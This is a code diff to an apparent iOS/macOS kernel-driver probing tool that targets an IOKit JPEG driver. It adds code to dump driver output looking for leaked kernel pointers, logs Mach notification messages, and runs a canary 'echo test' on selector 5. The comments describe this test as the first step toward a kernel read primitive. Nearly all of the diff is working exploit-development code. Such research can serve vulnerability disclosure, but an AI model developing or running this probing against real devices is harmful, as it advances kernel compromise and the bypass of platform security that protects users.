@@ -760,12 +760,36 @@ static void rs_jm_fill(RSJpegIn *in, uint32_t srcID, uint32_t dstID,
     in->asyncToken = token;
 }
 
+// Dump bytes as 64-bit words first (a kernel pointer or a leaked address shows
+// up there immediately), then as hex.  This is the first kernel->userland data
+// we have ever been able to read, so the content matters more than the kr.
+static void rs_jm_dump(NSString *what, const uint8_t *p, size_t len) {
+    if (!p || len < 8) return;
+    size_t n = len > 512 ? 512 : len;
+    AveLog(S(@"%@ dump: %zu bytes (showing %zu)", what, len, n));
+    for (size_t k = 0; k + 8 <= n; k += 8) {
+        uint64_t w;
+        memcpy(&w, p + k, 8);
+        AveLog(S(@"%@  +%04zx = 0x%016llx", what, k, w));
+    }
+    NSMutableString *hex = [NSMutableString string];
+    for (size_t k = 0; k < n; k++) {
+        [hex appendFormat:@"%02x", p[k]];
+        if ((k & 31) == 31) [hex appendString:@"\n"];
+    }
+    AveLog(S(@"%@ hex: %@", what, hex));
+}
+
 static void rs_jm_call(io_connect_t conn, uint32_t sel, const void *in, size_t inLen,
                        void *out, size_t outLen, NSString *label) {
     if (sel > 20) { AveLog(S(@"sel%u %@: invalid selector", sel, label)); return; }
     size_t os = outLen;
     kern_return_t kr = IOConnectCallStructMethod(conn, sel, in, inLen, out, &os);
     AveLog(S(@"sel%u %@ kr=%#x outSize=%zu", sel, label, kr, os));
+    // a successful struct call that filled the output buffer is a candidate
+    // read primitive - dump what the driver wrote back to userland
+    if (kr == KERN_SUCCESS && out && os > 0)
+        rs_jm_dump(S(@"sel%u out", sel), (const uint8_t *)out, os);
 }
 
 static void rs_jm_drain(mach_port_t port, NSString *label) {
@@ -776,7 +800,11 @@ static void rs_jm_drain(mach_port_t port, NSString *label) {
         kern_return_t kr = mach_msg(h, MACH_RCV_MSG | MACH_RCV_TIMEOUT,
                                     0, sizeof(msg), port, 10, MACH_PORT_NULL);
         if (kr != MACH_MSG_SUCCESS) break;
-        AveLog(S(@"notify %@ id=%u size=%u", label, h->msgh_id, h->msgh_size));
+        AveLog(S(@"notify %@ id=%u size=%u bits=%#x remote=%#x local=%#x",
+                 label, h->msgh_id, h->msgh_size, h->msgh_bits,
+                 h->msgh_remote_port, h->msgh_local_port));
+        if (h->msgh_size >= sizeof(mach_msg_header_t) && h->msgh_size <= sizeof(msg))
+            rs_jm_dump(S(@"notify %@", label), (const uint8_t *)msg, h->msgh_size);
     }
 }
 
@@ -907,6 +935,28 @@ NSString *ModJpegMethods(void) {
     rs_jm_call(conn, 9, NULL, 0, NULL, 0, @"privileged no args");
     rs_jm_call(conn, 10, NULL, 0, NULL, 0, @"out of range");
     rs_jm_drain(notify, @"end");
+
+    // ---- echo test: sel5 is the ONE big-struct selector that returned kr=0 on
+    //      this build.  Fill everything past the 0x58 header with our canary
+    //      and see which offsets come back in the 4096-byte output.  Any
+    //      echoed canary is a CONTROLLED read-back channel through the driver,
+    //      which is the first step towards a kernel read primitive. ----
+    for (int round = 0; round < 2; round++) {
+        uint8_t *big = (uint8_t *)malloc(0x1000);
+        uint8_t *bigo = (uint8_t *)malloc(0x1000);
+        if (!big || !bigo) { free(big); free(bigo); break; }
+        memset(big, 0, 0x1000);
+        memset(bigo, 0, 0x1000);
+        rs_jm_fill((RSJpegIn *)big, srcID, dstID, W, H, 0, 0x6161 + (uint64_t)round);
+        for (uint32_t k = (uint32_t)sizeof(RSJpegIn); k + 8 <= 0x1000; k += 8) {
+            uint64_t v = 0xC0FFEE5A00000000ull | (uint64_t)k | ((uint64_t)round << 32);
+            memcpy(big + k, &v, 8);
+        }
+        rs_jm_call(conn, 5, big, 0x1000, bigo, 0x1000, S(@"echo sel5 round=%d", round));
+        rs_jm_drain(notify, S(@"echo sel5 round=%d", round));
+        free(big);
+        free(bigo);
+    }
 
     IOServiceClose(conn);
     CFRelease(src); CFRelease(dst); CFRelease(encSrc); CFRelease(encDst);
